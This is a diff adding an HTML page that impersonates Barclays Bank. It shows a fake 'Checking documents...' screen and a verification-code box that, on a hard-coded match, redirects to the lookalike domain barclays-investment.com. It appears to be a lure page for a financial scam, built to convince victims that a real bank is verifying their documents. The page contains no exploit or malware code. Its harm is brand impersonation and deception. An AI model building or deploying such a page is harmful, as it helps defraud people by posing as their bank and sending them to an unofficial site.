@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Barclays Bank</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #0061aa; /* Arxa fon tünd mavi */
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+
+        /* Barclays Logo */
+        #barclays-logo {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 20px;
+            animation: blinkAnimation 1s infinite alternate;
+            filter: invert(48%) sepia(100%) saturate(300%) hue-rotate(180deg);
+        }
+
+        /* Barclays Bank Text */
+        #barclays-text {
+            font-size: 36px;
+            font-weight: bold;
+            color: #1E90FF; /* Açıq göy rəng */
+            margin-bottom: 20px;
+            animation: blinkAnimation 1s infinite alternate;
+        }
+
+        /* Blinking effect for both logo and text */
+        @keyframes blinkAnimation {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        #welcome-text {
+            font-size: 24px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        #welcome-message {
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .dots::after {
+            content: "";
+            display: inline-block;
+            animation: dotsAnimation 1.5s infinite steps(4);
+        }
+
+        @keyframes dotsAnimation {
+            0% { content: ""; }
+            25% { content: "."; }
+            50% { content: ".."; }
+            75% { content: "..."; }
+        }
+
+        #verification-section {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            color: black;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        input {
+            padding: 10px;
+            width: 250px;
+            margin-right: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        button {
+            padding: 10px 15px;
+            background-color: #0061aa;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #004b87;
+        }
+    </style>
+    <script>
+        function checkCode() {
+            var inputCode = document.getElementById("verification-code").value;
+            var correctCode = " MSI61HKD498384891882";
+            
+            if (inputCode === correctCode) {
+                window.location.href = "https://barclays-investment.com/verify/MSI61HKD4%2098384891882/scct/index.html";
+            } else {
+                alert("Incorrect code. Please try again.");
+            }
+        }
+    </script>
+</head>
+<body>
+    <!-- Barclays Logo -->
+    <img src="barclays-logo.png" id="barclays-logo" alt="Barclays Eagle Logo">
+
+    <!-- Barclays Bank Text -->
+    <div id="barclays-text">Welcome to Barclays Bank Plc, UK</div>
+
+    <!-- Welcome text below the logo -->
+    <div id="welcome-text"></div>
+
+    <div id="welcome-message">Checking documents...<span class="dots"></span></div>
+    
+    <div id="verification-section">
+        <input type="text" id="verification-code" placeholder="Enter verification code">
+        <button onclick="checkCode()">Check</button>
+    </div>
+</body>
+</html>
